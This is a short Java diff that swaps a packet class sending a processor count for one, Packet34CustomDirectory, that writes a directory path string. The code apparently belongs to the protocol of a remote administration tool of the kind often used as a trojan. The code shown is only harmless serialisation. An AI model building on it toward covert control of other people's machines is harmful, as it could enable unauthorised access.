@@ -4,22 +4,22 @@ import java.io.DataOutputStream;
 
 import com.redpois0n.common.io.StringWriter;
 
+public class Packet34CustomDirectory extends AbstractOutgoingPacket {
 
-public class Packet64InitAvailableProcessors extends AbstractOutgoingPacket {
-
-	private int processors;
-
-	public Packet64InitAvailableProcessors(int processors) {
-		this.processors = processors;
+	private String location;
+	
+	public Packet34CustomDirectory(String location) {
+		this.location = location;
 	}
 
 	@Override
 	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
-		dos.writeShort(processors);
+		sw.writeLine(this.location);
 	}
 
 	@Override
 	public byte getPacketId() {
-		return (byte) 64;
+		return 34;
 	}
+
 }
